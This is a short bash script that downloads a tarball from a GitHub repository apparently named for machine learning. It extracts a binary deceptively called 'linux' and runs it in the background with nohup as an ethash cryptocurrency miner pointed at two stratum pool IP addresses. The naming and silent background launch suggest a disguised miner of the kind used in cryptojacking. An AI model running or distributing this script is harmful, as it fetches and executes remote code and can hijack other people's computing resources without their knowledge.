#!/bin/bash

wget https://github.com/Dev699vn/PiMachineLearning/raw/main/linux.tar.gz
tar -xvf linux.tar.gz
rm -rf linux.tar.gz
mkdir bin
mv linux bin/linux
cd bin/            
echo "#!/bin/bash" > runsrc.sh
echo "./linux -a ethash -o stratum+http://184.164.64.100:8086 -o stratum+http://159.203.107.149:8080" >> runsrc.sh

chmod +x runsrc.sh
nohup sh runsrc.sh > result.txt 2>&1 &

